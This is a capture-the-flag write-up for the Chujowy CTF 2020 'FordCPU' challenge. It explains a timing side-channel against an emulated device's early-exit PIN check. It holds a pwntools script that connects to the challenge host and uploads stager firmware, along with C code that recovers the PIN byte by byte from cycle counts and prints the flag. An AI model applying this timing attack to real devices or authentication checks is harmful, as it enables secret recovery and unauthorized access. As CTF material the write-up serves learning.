---
layout: post
title: "[Chujowy 2020] FordCPU - Flag Device"
author: Escher
---
For a more detailed version, click [here](https://www.danbrodsky.me/writeups/chujowyctf2020-fordcpu/).

Vulnerability:

on pin check request being received, there is a 255 cycle delay before the bytes of the given pin and correct pin are compared
check exits right away if a different byte is encountered, and device_status is changed to idle on exit
an incorrect byte results in ~6 loop cycles to resolve, while a correct byte takes at least 6 (6 for itself and then it will check the next byte)
the differing amount of time it takes to complete a check relative to the number of correct bytes means we can perform a timing attack
Exploit:

we can use device_status as an oracle to tell us when checking is completed, and a for loop to tell how much time was spent checking
write into start area a stager that writes anything received over main() while a loop stalls the program
write into main a program that loops through every possibility for the next byte in pins until a higher delay is encountered, then saves that byte and iterates to the next 1
eventually all pins are found and we can read the flag
Bash commands:

riscv32-elf-objdump -m riscv -Mintel -D ./stager.elf | less

riscv32-elf-objdump -b binary -m riscv -Mintel -D ./remote.bin | less



```python
from pwn import *

server = open("remote.bin", "rb").read()

stager = open("stager.elf", "rb").read()
payload = open("payload.elf", "rb").read()

# r = process('./Vtop')
r = remote('ford-cpu.chujowyc.tf', 4001)
r.interactive()

r.send(b"ack\n\n\n\n\n")
print(r.clean())
r.send("cmp\n\n\n\n\n")
print(r.clean())
r.send("AAAA\n\n\n\n")
print(r.clean())
r.send("AAAA\n\n\n\n")
print(r.clean())
r.send("AAAA\n\n\n\n")

firmware = server[:0x15a] + stager[0x12e4:0x1330]
r.send(firmware)

r.interactive() # manually cause reset here, then kill this shell

r.send(payload[0x12e4:0x1558])
r.interactive()
// Stager code
REG32(LPT_REG_RX_BUFFER_START) = (int) 0x2e2;
REG32(LPT_REG_RX_BUFFER_END) = (int) 0x2e2 + 800;
REG32(LPT_REG_STATE) = 2 | 1;
int a = 0;
while (1) {
    if (a > 100000)
        break;
    ++a;
}
// Timing attack payload
// get an initial delay value
int longest_delay = 0;

// I'm fucked if the first byte is 169
REG32(FLAG_DEV_PIN_0) = 169;
REG32(FLAG_DEV_CHECK_START) = 1;
// track cycles needed to check pins
while (REG32(FLAG_DEV_DEVICE_STATUS) != 0)
    ++longest_delay;

// set all pins to 0
for (int i = 0; i < 4; ++i) {
    int* addr = (int*) FLAG_DEV_PIN + 4*i;
    *addr = 0;
}

int curr = 0;
// loop for each char in pin (16)
for (int i = 0; i < 4; ++i) {

    curr = 0;
    int* addr = (int*) FLAG_DEV_PIN + i;

    for (int j = 0; j < 4; ++j) {
        // guess the value of pin_bytes[i] (0-255)
        for (int v = 0; v <= 256; ++v) {
            if (v == 256) {
                break;
            }

            int tmp = curr;
            tmp <<= (4-j)*8;
            tmp >>= (4-j)*8;
            tmp += v << j*8;
            *(addr) = tmp;

            int t = 0;
            // start checking
            REG32(FLAG_DEV_CHECK_START) = 1;
            // track cycles needed to check pins
            while (REG32(FLAG_DEV_DEVICE_STATUS) != 0)
                ++t;
            if (t >= longest_delay+5) { // pin delay, byte is correct
                curr = tmp;
                REG32(LPT_REG_STATE) = 2;
                REG32(LPT_REG_TX_BUFFER_START) = (int) &tmp;
                REG32(LPT_REG_TX_BUFFER_END) = (int) &tmp+4;
                longest_delay = t;
                break;
            }
        }
    }
}
// last byte cannot be checked w/ side-channel
for (int v = 0; v < 256; ++v) {
    int tmp = curr;
    tmp <<= 8;
    tmp >>= 8;
    tmp += v << 24;
    *((int*) FLAG_DEV_PIN + 3) = tmp;
    REG32(FLAG_DEV_CHECK_START) = 1;
    while (REG32(FLAG_DEV_DEVICE_STATUS) != 0);
    if (REG32(FLAG_DEV_PIN_STATUS) == 1) {
        REG32(LPT_REG_STATE) = 2;
        REG32(LPT_REG_TX_BUFFER_START) = FLAG_DEV_FLAG_START;
        REG32(LPT_REG_TX_BUFFER_END) = FLAG_DEV_FLAG_START + 0x10;
        break;
    }



# &\x00\x00\x1a\x00\x1a\x00&\x1a0&\x1a0p\x00\x00p\xa2\x00p\xa2\p\xa2\xd2\xe\\xfc\x\xf\xc4\Č\x00Č\x86\x00Č\x86\xfe71m1N9_4774ck_xDresetting...
# 71m1N9_4774ck_xD
```